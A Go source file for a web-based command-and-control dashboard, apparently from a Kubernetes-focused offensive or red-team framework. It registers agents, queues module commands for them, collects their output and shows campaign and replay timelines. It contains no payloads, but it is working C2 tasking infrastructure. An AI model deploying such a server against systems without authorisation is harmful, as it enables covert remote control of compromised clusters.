package webui

import (
	"context"
	"embed"
	"encoding/json"
	"fmt"
	"html/template"
	"net/http"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/yasindce1998/KubeDagger/pkg/events"
)

//go:embed templates/*.html
var templateFS embed.FS

// Server is the web-based C2 dashboard that manages agent registration and command dispatch.
type Server struct {
	addr     string
	agents   *AgentStore
	commands *CommandQueue
	events   *events.Store
	mux      *http.ServeMux
	server   *http.Server
	auth     AuthConfig
	sessions *sessionStore
}

// AgentInfo represents a connected agent's identity and environment metadata.
type AgentInfo struct {
	ID        string    `json:"id"`
	Hostname  string    `json:"hostname"`
	IP        string    `json:"ip"`
	OS        string    `json:"os"`
	Arch      string    `json:"arch"`
	Cluster   string    `json:"cluster"`
	Namespace string    `json:"namespace"`
	Pod       string    `json:"pod"`
	LastSeen  time.Time `json:"last_seen"`
	Modules   []string  `json:"modules"`
	Status    string    `json:"status"`
}

// Command represents a module execution request dispatched to an agent.
type Command struct {
	ID        string            `json:"id"`
	AgentID   string            `json:"agent_id"`
	Module    string            `json:"module"`
	Args      map[string]string `json:"args"`
	Status    string            `json:"status"`
	Output    string            `json:"output"`
	CreatedAt time.Time         `json:"created_at"`
	DoneAt    time.Time         `json:"done_at,omitempty"`
}

// AgentStore is a thread-safe in-memory registry of connected agents.
type AgentStore struct {
	mu     sync.RWMutex
	agents map[string]*AgentInfo
}

// CommandQueue is a thread-safe store for pending and completed commands.
type CommandQueue struct {
	mu       sync.RWMutex
	commands map[string]*Command
	pending  map[string][]*Command
}

// NewServer creates a web UI server listening on the given address.
// If token is non-empty, all routes require authentication. Events are kept
// in a private memory-only store; use NewServerWithEvents to share a store
// (and its optional JSONL persistence) with the rest of the server.
func NewServer(addr, token string) *Server {
	// A memory-only store never fails to initialize.
	store, _ := events.NewStore("")
	return newServer(addr, token, store)
}

// NewServerWithEvents creates a web UI server that renders campaign and
// replay views from the given events store. If store is nil, a memory-only
// store is used.
func NewServerWithEvents(addr, token string, store *events.Store) *Server {
	if store == nil {
		// A memory-only store never fails to initialize.
		store, _ = events.NewStore("")
	}
	return newServer(addr, token, store)
}

func newServer(addr, token string, store *events.Store) *Server {
	s := &Server{
		addr: addr,
		agents: &AgentStore{
			agents: make(map[string]*AgentInfo),
		},
		commands: &CommandQueue{
			commands: make(map[string]*Command),
			pending:  make(map[string][]*Command),
		},
		events:   store,
		mux:      http.NewServeMux(),
		sessions: newSessionStore(),
		auth: AuthConfig{
			Token:   token,
			Enabled: token != "",
		},
	}
	s.registerRoutes()
	return s
}

// Start begins serving HTTP requests and blocks until the context is cancelled.
func (s *Server) Start(ctx context.Context) error {
	s.server = &http.Server{
		Addr:              s.addr,
		Handler:           s.mux,
		ReadHeaderTimeout: 10 * time.Second,
	}

	go func() {
		<-ctx.Done()
		shutdownCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		_ = s.server.Shutdown(shutdownCtx)
	}()

	return s.server.ListenAndServe()
}

func (s *Server) registerRoutes() {
	s.mux.HandleFunc("/", s.dashboardAuth(s.handleDashboard))
	s.mux.HandleFunc("/campaign", s.dashboardAuth(s.handleCampaign))
	s.mux.HandleFunc("/replay", s.dashboardAuth(s.handleReplay))
	s.mux.HandleFunc("/login", s.handleLoginPost)
	s.mux.HandleFunc("/logout", s.handleLogout)
	s.mux.HandleFunc("/api/agents", s.authMiddleware(s.handleAgents))
	s.mux.HandleFunc("/api/agents/register", s.authMiddleware(s.handleAgentRegister))
	s.mux.HandleFunc("/api/commands", s.authMiddleware(s.handleCommands))
	s.mux.HandleFunc("/api/commands/new", s.authMiddleware(s.handleNewCommand))
	s.mux.HandleFunc("/api/commands/poll", s.authMiddleware(s.handlePollCommands))
	s.mux.HandleFunc("/api/commands/result", s.authMiddleware(s.handleCommandResult))
}

func (s *Server) handleDashboard(w http.ResponseWriter, r *http.Request) {
	tmpl, err := template.ParseFS(templateFS, "templates/dashboard.html")
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	s.agents.mu.RLock()
	agents := make([]*AgentInfo, 0, len(s.agents.agents))
	for _, a := range s.agents.agents {
		agents = append(agents, a)
	}
	s.agents.mu.RUnlock()

	s.commands.mu.RLock()
	commands := make([]*Command, 0, len(s.commands.commands))
	for _, c := range s.commands.commands {
		commands = append(commands, c)
	}
	s.commands.mu.RUnlock()

	data := map[string]any{
		"Agents":   agents,
		"Commands": commands,
	}

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	_ = tmpl.Execute(w, data)
}

func (s *Server) handleAgents(w http.ResponseWriter, _ *http.Request) {
	s.agents.mu.RLock()
	defer s.agents.mu.RUnlock()

	agents := make([]*AgentInfo, 0, len(s.agents.agents))
	for _, a := range s.agents.agents {
		agents = append(agents, a)
	}

	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(agents)
}

func (s *Server) handleAgentRegister(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var info AgentInfo
	if err := json.NewDecoder(r.Body).Decode(&info); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	info.LastSeen = time.Now()
	info.Status = "active"

	s.agents.mu.Lock()
	s.agents.agents[info.ID] = &info
	s.agents.mu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]string{"status": "registered"})
}

func (s *Server) handleCommands(w http.ResponseWriter, _ *http.Request) {
	s.commands.mu.RLock()
	defer s.commands.mu.RUnlock()

	commands := make([]*Command, 0, len(s.commands.commands))
	for _, c := range s.commands.commands {
		commands = append(commands, c)
	}

	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(commands)
}

func (s *Server) handleNewCommand(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var cmd Command
	if err := json.NewDecoder(r.Body).Decode(&cmd); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	cmd.ID = fmt.Sprintf("cmd-%d", time.Now().UnixNano())
	cmd.Status = "pending"
	cmd.CreatedAt = time.Now()

	s.commands.mu.Lock()
	s.commands.commands[cmd.ID] = &cmd
	s.commands.pending[cmd.AgentID] = append(s.commands.pending[cmd.AgentID], &cmd)
	s.commands.mu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(cmd)
}

func (s *Server) handlePollCommands(w http.ResponseWriter, r *http.Request) {
	agentID := r.URL.Query().Get("agent_id")
	if agentID == "" {
		http.Error(w, "agent_id required", http.StatusBadRequest)
		return
	}

	s.agents.mu.Lock()
	if a, ok := s.agents.agents[agentID]; ok {
		a.LastSeen = time.Now()
	}
	s.agents.mu.Unlock()

	s.commands.mu.Lock()
	pending := s.commands.pending[agentID]
	s.commands.pending[agentID] = nil
	for _, cmd := range pending {
		cmd.Status = "dispatched"
	}
	s.commands.mu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(pending)
}

func (s *Server) handleCommandResult(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var result struct {
		CommandID string `json:"command_id"`
		Output    string `json:"output"`
		Success   bool   `json:"success"`
	}

	if err := json.NewDecoder(r.Body).Decode(&result); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	s.commands.mu.Lock()
	if cmd, ok := s.commands.commands[result.CommandID]; ok {
		cmd.Output = result.Output
		cmd.DoneAt = time.Now()
		if result.Success {
			cmd.Status = "completed"
		} else {
			cmd.Status = "failed"
		}
	}
	s.commands.mu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

// Campaign and replay view tuning limits.
const (
	campaignDefaultLimit = 200
	campaignMaxLimit     = 1000
	replayMaxStep        = 50
	detailMaxRunes       = 100
)

// campaignEvent is a campaign-timeline view of an events.Event with the
// detail column truncated for table display.
type campaignEvent struct {
	events.Event
	DetailShort string
}

// replayPayload is a single key=value pair rendered on replay cards.
type replayPayload struct {
	Key   string
	Value string
}

// replayEvent is a detailed card view of an events.Event with its payload
// rendered as a sorted key=value list.
type replayEvent struct {
	events.Event
	PayloadPairs []replayPayload
}

// selectOption is one entry of a filter dropdown.
type selectOption struct {
	Value    string
	Label    string
	Selected bool
}

// campaignTypeOptions builds the event type filter options, marking the
// given value (or "all" when empty) as selected.
func campaignTypeOptions(selected string) []selectOption {
	opts := []selectOption{
		{Value: "all", Label: "all"},
		{Value: events.TypeAgentCheckin, Label: events.TypeAgentCheckin},
		{Value: events.TypeTaskSubmitted, Label: events.TypeTaskSubmitted},
		{Value: events.TypeTaskResult, Label: events.TypeTaskResult},
	}
	if selected == "" {
		selected = "all"
	}
	for i := range opts {
		opts[i].Selected = opts[i].Value == selected
	}
	return opts
}

// truncateDetail shortens s to at most n runes, appending an ellipsis when
// characters were dropped.
func truncateDetail(s string, n int) string {
	if n <= 0 {
		return ""
	}
	r := []rune(s)
	if len(r) <= n {
		return s
	}
	return string(r[:n]) + "..."
}

func (s *Server) handleCampaign(w http.ResponseWriter, r *http.Request) {
	tmpl, err := template.ParseFS(templateFS, "templates/campaign.html")
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	agentFilter := strings.TrimSpace(r.URL.Query().Get("agent"))
	typeFilter := r.URL.Query().Get("type")

	limit := campaignDefaultLimit
	if v, err := strconv.Atoi(r.URL.Query().Get("limit")); err == nil && v > 0 {
		limit = v
	}
	if limit > campaignMaxLimit {
		limit = campaignMaxLimit
	}

	all := s.events.List(0, 0)
	filtered := make([]campaignEvent, 0, len(all))
	for _, e := range all {
		if agentFilter != "" && !strings.Contains(strings.ToLower(e.AgentID), strings.ToLower(agentFilter)) {
			continue
		}
		if typeFilter != "" && typeFilter != "all" && e.Type != typeFilter {
			continue
		}
		filtered = append(filtered, campaignEvent{
			Event:       e,
			DetailShort: truncateDetail(e.Detail, detailMaxRunes),
		})
	}

	shown := filtered
	if len(shown) > limit {
		shown = shown[:limit]
	}

	data := map[string]any{
		"Total":       s.events.Count(),
		"Shown":       len(shown),
		"Events":      shown,
		"AgentFilter": agentFilter,
		"TypeFilter":  typeFilter,
		"TypeOptions": campaignTypeOptions(typeFilter),
		"Limit":       limit,
	}

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	_ = tmpl.Execute(w, data)
}

func (s *Server) handleReplay(w http.ResponseWriter, r *http.Request) {
	tmpl, err := template.ParseFS(templateFS, "templates/replay.html")
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	offset := 0
	if v, err := strconv.Atoi(r.URL.Query().Get("offset")); err == nil && v > 0 {
		offset = v
	}
	step := 1
	if v, err := strconv.Atoi(r.URL.Query().Get("step")); err == nil && v > 0 {
		step = v
	}
	if step > replayMaxStep {
		step = replayMaxStep
	}

	total := s.events.Count()
	if offset > total {
		offset = total
	}

	evs := s.events.List(offset, step)
	end := offset + len(evs)

	cards := make([]replayEvent, 0, len(evs))
	for _, e := range evs {
		card := replayEvent{Event: e}
		for k, v := range e.Payload {
			card.PayloadPairs = append(card.PayloadPairs, replayPayload{Key: k, Value: v})
		}
		sort.Slice(card.PayloadPairs, func(i, j int) bool {
			return card.PayloadPairs[i].Key < card.PayloadPairs[j].Key
		})
		cards = append(cards, card)
	}

	newerOffset := offset - step
	if newerOffset < 0 {
		newerOffset = 0
	}

	from := offset
	if len(evs) > 0 {
		from = offset + 1
	}

	data := map[string]any{
		"Events":      cards,
		"Total":       total,
		"Offset":      offset,
		"Step":        step,
		"From":        from,
		"To":          end,
		"HasNewer":    offset > 0,
		"HasOlder":    end < total,
		"NewerOffset": newerOffset,
		"OlderOffset": offset + step,
	}

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	_ = tmpl.Execute(w, data)
}
